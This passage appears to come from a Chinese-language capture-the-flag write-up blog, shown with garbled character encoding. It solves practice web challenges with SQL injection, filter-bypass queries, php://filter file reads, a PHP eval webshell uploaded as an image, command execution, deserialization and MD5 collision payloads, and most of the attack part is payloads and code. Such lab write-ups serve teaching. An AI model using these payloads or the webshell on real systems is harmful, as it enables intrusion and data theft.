</span></span></code></pre></div><h3 id=è§£é¢˜3-1>è§£é¢˜3</h3><p>åˆ©ç”¨handleræ‰“å¼€æŸ¥è¯¢ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¸¸è§çš„æ‰‹æ³•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#
</span></span></span></code></pre></div><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019secret-file>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>çœ‹æºç </p><p><code>/Archive_room.php</code></p><p>å†çœ‹</p><p><code>/action.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>   secr3t.php        
</span></span></span><span style=display:flex><span><span style=color:#75715e>--&gt;</span>
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><pre tabindex=0><code class=language-php+html data-lang=php+html>&lt;html&gt;
    &lt;title&gt;secret&lt;/title&gt;
    &lt;meta charset=&#34;UTF-8&#34;&gt;
&lt;?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET[&#39;file&#39;];
    if(strstr($file,&#34;../&#34;)||stristr($file, &#34;tp&#34;)||stristr($file,&#34;input&#34;)||stristr($file,&#34;data&#34;)){
        echo &#34;Oh no!&#34;;
        exit();
    }
    include($file); 
//flagæ”¾åœ¨äº†flag.phpé‡Œ
?&gt;
&lt;/html&gt;
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/secr3t.php?file<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>flag.php
</span></span></code></pre></div><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019http>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>çœ‹æºç <code>/Secret.php</code></p><pre tabindex=0><code>Referer	https://Sycsecret.buuoj.cn
User-Agent	Syclover
X-Forwarded-For	127.0.0.1
</code></pre><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019upload>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;script language=&#34;php&#34;&gt;@eval($_POST[sb])&lt;/script&gt; 
</code></pre><p>å†™å…¥å›¾ç‰‡é©¬ï¼ŒbpæŠ“åŒ…æ‹¦æˆªæ”¹phtmlï¼Œç„¶åèšå‰‘è¿ä¸Šå°±è¡Œ</p><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019knife>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Syc<span style=color:#f92672>=</span>system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;cat /f*&#39;</span><span style=color:#f92672>)</span>;
</span></span></code></pre></div><p>postå‘åŒ…</p><h2 id=actf2020-æ–°ç”Ÿèµ›upload>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>å‚è€ƒä¸Šé¢çš„æå®¢å¤§æŒ‘æˆ˜ï¼Œæˆ‘ç›´æ¥åšæ³•ä¸€è‡´</p><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019babysql>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>admin</span><span style=color:#e6db74>&#34; or 1=1#
</span></span></span></code></pre></div><p>ä¸èƒ½ç›´æ¥ç™»å½•ï¼Œbpæ¥fuzzä¸€ä¸‹å§</p><p>ä¸»è¦åˆ†ä¸ºä¸‰ç§ï¼Œerrorå’Œnopasswordå’Œinput</p><p>åº”è¯¥æ˜¯è¿‡æ»¤äº†selectå’Œunion,è¿˜æœ‰ä¸€äº›è¿‡æ»¤è‡ªå·±æµ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>â€™</span>ununionion seselectlect <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span><span style=color:#f92672>#</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span>ununionion<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>seselectlect<span style=color:#f92672>%</span><span style=color:#ae81ff>201</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span><span style=color:#f92672>%</span><span style=color:#ae81ff>23</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Â <span style=color:#ae81ff>1</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span>ununionion<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>seselectlect<span style=color:#f92672>%</span><span style=color:#ae81ff>201</span>,<span style=color:#66d9ef>database</span>(),<span style=color:#ae81ff>3</span><span style=color:#f92672>%</span><span style=color:#ae81ff>23</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>ununionion<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>seselectlect<span style=color:#f92672>%</span><span style=color:#ae81ff>201</span>,<span style=color:#ae81ff>2</span>,group_concat(<span style=color:#66d9ef>table_name</span>)<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>frfromom<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>infoorrmation_schema.tables<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>whwhereere<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>table_schema<span style=color:#f92672>=%</span><span style=color:#ae81ff>27</span>geek<span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>%</span><span style=color:#ae81ff>23</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>ununionion<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>seselectlect<span style=color:#f92672>%</span><span style=color:#ae81ff>201</span>,<span style=color:#ae81ff>2</span>,group_concat(<span style=color:#66d9ef>column_name</span>)<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>frfromom<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>infoorrmation_schema.columns<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>whwhereere<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>table_schema<span style=color:#f92672>=%</span><span style=color:#ae81ff>27</span>b4bsql<span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>%</span><span style=color:#ae81ff>23</span>
</span></span></code></pre></div><p>å‘ç°æ²¡æ‰¾åˆ°ï¼Œç›´æ¥æ”¾æœ€åä¸€æ­¥å§ï¼Œæ…¢æ…¢æ‰¾</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>ununionion<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>seselectlect<span style=color:#f92672>%</span><span style=color:#ae81ff>201</span>,<span style=color:#ae81ff>2</span>,group_concat(flag)<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>frfromom<span style=color:#f92672>%</span><span style=color:#ae81ff>20</span>ctf.Flag<span style=color:#f92672>%</span><span style=color:#ae81ff>23</span>
</span></span></code></pre></div><p>è¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¼„æ¸…è¿‡æ»¤ä»€ä¹ˆå°±è¡Œ</p><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019php>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>è®¿é—®<code>/www.zip</code></p><p>çœ‹class.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Name</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;nonono&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;yesyes&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($username,$password){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> $username;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> $password;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>password</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>100</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;You name is: &#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span>;<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;You password is: &#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>password</span>;<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;admin&#39;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>global</span> $flag;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><pre tabindex=0><code>&lt;?php
class Name{
    private $username = &#39;nonono&#39;;
    private $password = &#39;yesyes&#39;;

    public function __construct($username, $password){
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }
}

$obj = new Name(&#39;admin&#39;, 100);

echo serialize($obj);
?&gt;#ä¿®æ”¹ç»•è¿‡O:4:&#34;Name&#34;:3:{s:14:&#34;%00Name%00username&#34;;s:5:&#34;admin&#34;;s:14:&#34;%00Name%00password&#34;;i:100;}
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/index.php?select<span style=color:#f92672>=</span>O:4:<span style=color:#e6db74>&#34;Name&#34;</span>:3:<span style=color:#f92672>{</span>s:14:<span style=color:#e6db74>&#34;%00Name%00username&#34;</span>;s:5:<span style=color:#e6db74>&#34;admin&#34;</span>;s:14:<span style=color:#e6db74>&#34;%00Name%00password&#34;</span>;i:100;<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=actf2020-æ–°ç”Ÿèµ›backupfile>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>diræ‰¾åˆ°</p><pre tabindex=0><code>[15:27:32] 200 -   347B - /index.php.bak
</code></pre><p>ä¸‹è½½å</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include_once</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;key&#39;</span>])) {
</span></span><span style=display:flex><span>    $key <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;key&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>is_numeric</span>($key)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>(<span style=color:#e6db74>&#34;Just num!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $key <span style=color:#f92672>=</span> <span style=color:#a6e22e>intval</span>($key);
</span></span><span style=display:flex><span>    $str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($key <span style=color:#f92672>==</span> $str) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Try to find out source file!&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>?key=123
</code></pre><h2 id=roarctf-2019easy-calc>[RoarCTF 2019]Easy Calc</h2><p>çœ‹ä¸€ä¸‹æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>   $(&#39;#calc&#39;).submit(function(){
</span></span><span style=display:flex><span>        $.ajax({
</span></span><span style=display:flex><span>            url:&#34;calc.php?num=&#34;+encodeURIComponent($(&#34;#content&#34;).val()),
</span></span><span style=display:flex><span>            type:&#39;GET&#39;,
</span></span><span style=display:flex><span>            success:function(data){
</span></span><span style=display:flex><span>                $(&#34;#result&#34;).html(`&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;alert alert-success&#34;</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>strong</span>&gt;ç­”æ¡ˆ:&lt;/<span style=color:#f92672>strong</span>&gt;${data}
</span></span><span style=display:flex><span>            &lt;/<span style=color:#f92672>div</span>&gt;`);
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            error:function(){
</span></span><span style=display:flex><span>                alert(&#34;è¿™å•¥?ç®—ä¸æ¥!&#34;);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        return false;
</span></span><span style=display:flex><span>    })
</span></span></code></pre></div><p>çœ‹ä¸€ä¸‹æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;num&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        $str <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;num&#39;</span>];
</span></span><span style=display:flex><span>        $blacklist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39; &#39;</span>, <span style=color:#e6db74>&#39;\t&#39;</span>, <span style=color:#e6db74>&#39;\r&#39;</span>, <span style=color:#e6db74>&#39;\n&#39;</span>,<span style=color:#e6db74>&#39;\&#39;&#39;</span>, <span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#39;`&#39;</span>, <span style=color:#e6db74>&#39;\[&#39;</span>, <span style=color:#e6db74>&#39;\]&#39;</span>,<span style=color:#e6db74>&#39;\$&#39;</span>,<span style=color:#e6db74>&#39;\\&#39;</span>,<span style=color:#e6db74>&#39;\^&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($blacklist <span style=color:#66d9ef>as</span> $blackitem) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> $blackitem <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/m&#39;</span>, $str)) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;what are you want to do?&#34;</span>);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;echo &#39;</span><span style=color:#f92672>.</span>$str<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;;&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/calc.php? num<span style=color:#f92672>=</span>1;var_dump<span style=color:#f92672>(</span>scandir<span style=color:#f92672>(</span>chr<span style=color:#f92672>(</span>47<span style=color:#f92672>)))</span>;
</span></span></code></pre></div><p>è¯»å–å½“å‰ç›®å½•çš„å†…å®¹æ‰¾åˆ°flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/calc.php? num<span style=color:#f92672>=</span>1;var_dump<span style=color:#f92672>(</span>include<span style=color:#f92672>(</span>chr<span style=color:#f92672>(</span>47<span style=color:#f92672>)</span>.chr<span style=color:#f92672>(</span>102<span style=color:#f92672>)</span>.chr<span style=color:#f92672>(</span>49<span style=color:#f92672>)</span>.chr<span style=color:#f92672>(</span>97<span style=color:#f92672>)</span>.chr<span style=color:#f92672>(</span>103<span style=color:#f92672>)</span>.chr<span style=color:#f92672>(</span>103<span style=color:#f92672>)))</span>;
</span></span></code></pre></div><p>è€ƒå¯Ÿçš„åå‡½æ•°ç»•è¿‡å§</p><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019buyflag>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;!--
	~~~post money and password~~~
if (isset($_POST[&#39;password&#39;])) {
	$password = $_POST[&#39;password&#39;];
	if (is_numeric($password)) {
		echo &#34;password can&#39;t be number&lt;/br&gt;&#34;;
	}elseif ($password == 404) {
		echo &#34;Password Right!&lt;/br&gt;&#34;;
	}
}
--&gt;
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>money<span style=color:#f92672>[]=</span>100000000&amp;password<span style=color:#f92672>=</span>404abc
</span></span><span style=display:flex><span>cookie:user<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><h2 id=bjdctf2020easy-md5>[BJDCTF2020]Easy MD5</h2><p>å‰ç«¯ä¸€èˆ¬ç›´æ¥æ‰¾ä¸åˆ°çš„è¯æŠ“åŒ…çœ‹çœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#39;admin&#39;</span> <span style=color:#66d9ef>where</span> password<span style=color:#f92672>=</span>md5(<span style=color:#960050;background-color:#1e0010>$</span>pass,<span style=color:#66d9ef>true</span>)
</span></span></code></pre></div><p>åˆ©ç”¨sqlç‰¹æ€§çš„md5çš„å­—ç¬¦ä¸²<code>ffifdyop</code>,è¿›å…¥ä¸‹ä¸€å±‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!--</span>
</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> $GET[<span style=color:#e6db74>&#39;a&#39;</span>];
</span></span><span style=display:flex><span>$b <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;b&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($a <span style=color:#f92672>!=</span> $b <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($a) <span style=color:#f92672>==</span> <span style=color:#a6e22e>md5</span>($b)){
</span></span><span style=display:flex><span>    <span style=color:#75715e>// wow, glzjin wants a girl friend.
</span></span></span><span style=display:flex><span><span style=color:#f92672>--&gt;</span>
</span></span></code></pre></div><pre tabindex=0><code>?a[]=1&amp;b[]=2
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;param1&#39;</span>]<span style=color:#f92672>!==</span>$_POST[<span style=color:#e6db74>&#39;param2&#39;</span>]<span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;param1&#39;</span>])<span style=color:#f92672>===</span><span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;param2&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>param1<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;param2<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></div><h2 id=hctf-2018admin>[HCTF 2018]admin</h2><h3 id=è§£é¢˜1-3>è§£é¢˜1</h3><p>å¼±å¯†ç </p><pre tabindex=0><code>admin :123
</code></pre><h3 id=è§£é¢˜2-3>è§£é¢˜2</h3><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åchange passwordï¼Œçœ‹æºç å¯ä»¥æ‰¾åˆ°</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>        <span style=color:#75715e>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span>
